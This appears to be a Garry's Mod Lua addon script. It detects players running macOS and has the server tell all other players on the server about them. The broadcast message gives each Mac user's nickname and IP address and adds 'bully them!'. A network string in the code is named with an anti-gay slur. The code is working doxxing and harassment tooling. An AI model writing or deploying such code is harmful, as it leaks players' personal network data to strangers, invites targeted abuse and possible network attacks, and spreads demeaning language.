function IsMac()
	return system.IsOSX()
end


if (CLIENT) then
	timer.Create("usesmac", 300, 0, function()
		if IsMac() then
			net.Start("systemismac")
			net.SendToServer()
		end
	end)

	net.Receive("gay", function()
		local shit = net.ReadString()
		LocalPlayer():ChatPrint(shit)
	end)
end

if (SERVER) then
	util.AddNetworkString("systemismac")
	util.AddNetworkString("gay")

	net.Receive("systemismac", function(l, ply)
		net.Start("gay")
		net.WriteString(ply:Nick() .. " " .. "is using a mac and their ip is " .. ply:IPAddress() .. " " .. "bully them!")
		for k,v in pairs(player.GetAll()) do 
			if v == ply then continue end
			net.Send(v)
		end 
	end)
end
